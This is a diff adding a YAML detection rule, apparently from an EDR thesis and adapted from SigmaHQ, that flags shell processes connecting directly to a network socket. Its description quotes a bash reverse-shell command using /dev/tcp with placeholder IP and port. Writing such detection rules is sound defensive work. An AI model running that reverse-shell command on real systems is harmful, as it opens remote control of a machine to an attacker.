@@ -1,0 +1,35 @@
+title: Bash Reverse Shell via Network Connection
+id: bash_network_reverse_shell
+status: stable
+description: >
+    Bash process directly connects to a remote socket — indicator of
+    bash -i >& /dev/tcp/IP/PORT 0>&1 style reverse shells.
+    Maps Sigma rule 83dcd9f6.
+references:
+    - https://attack.mitre.org/techniques/T1059/004/
+    - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_bash_reverse_shell.yml
+author: EDR Thesis (adapted from SigmaHQ)
+date: 2026-04-18
+tags:
+    - attack.execution
+    - attack.t1059.004
+severity: critical
+
+logsource:
+    category: provenance
+    product: edr
+
+detection:
+    selection:
+        subject:
+            type: PROCESS
+            name|re: '(?i)(^|/)(bash|sh|zsh|dash)$'
+        edge: CONNECT
+        object:
+            type: SOCKET
+
+    condition: selection
+
+falsepositives:
+    - Shell scripts making curl/wget calls (but those fork a child, not connect directly)
+level: critical
